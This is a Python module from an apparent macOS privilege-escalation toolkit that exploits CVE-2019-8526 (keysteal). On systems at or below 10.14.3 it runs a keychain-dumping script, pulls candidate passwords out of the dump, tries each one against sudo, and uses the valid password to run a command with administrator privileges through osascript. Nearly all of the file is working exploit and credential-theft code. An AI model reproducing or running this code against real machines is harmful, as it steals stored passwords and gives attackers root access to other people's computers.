"""root with no password"""
from __future__ import print_function

import base64
import binascii
import json
import os
import re
from distutils.version import LooseVersion

from .general import (
    DEFAULT_COMMAND,
    USER,
    get_values,
    interaction_prompt,
    osascript,
    random_string,
    try_password,
)

try:
    from json.decoder import JSONDecodeError
except ImportError:
    JSONDecodeError = ValueError

__cve__ = "2019-8526"
__credits__ = "pinauten.de"


def vulnerable(version):
    """checks vulnerability"""
    if version <= LooseVersion("10.14.3"):
        return interaction_prompt("Do you want to try to keysteal for sudo?")
    return


def read_passwords(text):
    """gets passwords from text"""
    data = re.findall('data:\n"(.*)"\nkeychain:', text) + re.findall(
        "data:\n'(.*)'\nkeychain:", text
    )
    passwords = list()
    for password in data:
        # Base64
        try:
            if base64.b64encode(base64.b64decode(password)) == password:
                password = base64.b64decode(password)
        except (TypeError, binascii.Error):
            pass

        password = str(password).strip()

        # JSON
        if password.startswith("{") or password.startswith("["):
            try:
                password = json.loads(password)
                values = get_values(password)
                passwords.extend(values)
                continue
            except JSONDecodeError:
                pass

        for bad_char in ["`", '"', "'"]:
            if bad_char in password:
                continue

        if len(password) > 31 or len(password) < 4 or not password[0]:
            continue

        passwords.append(password)

    return passwords


def run():
    """runs exploit"""
    keysteal_bash = "dump-keychain.sh"
    keysteal_zip = "keysteal.zip"

    if not os.path.exists(keysteal_bash) and os.path.exists(keysteal_zip):
        os.system("unzip " + keysteal_zip)

    response = osascript("sh {bin}".format(bin=keysteal_bash))

    passwords = read_passwords(response)

    print(passwords)

    print("\nTrying passwords...\n")

    real_password = None

    for password in passwords:
        try:
            print(" Trying: {password}".format(password=password), end="\r")
            valid = try_password(password)
        except Exception as e:
            print(type(e))
            print(str(e))
            continue
        if valid:
            real_password = password
            break

    if not real_password:
        return

    print("\nPassword: " + real_password)

    rand = random_string()
    payload = """osascript <<END
      set command to "{command}; echo {success}"
      return do shell script command user name "{user}" password "{password}" with administrator privileges
    END""".format(
        command=DEFAULT_COMMAND, success=rand, user=USER, password=real_password
    )
    response = osascript(payload)
    return rand in response
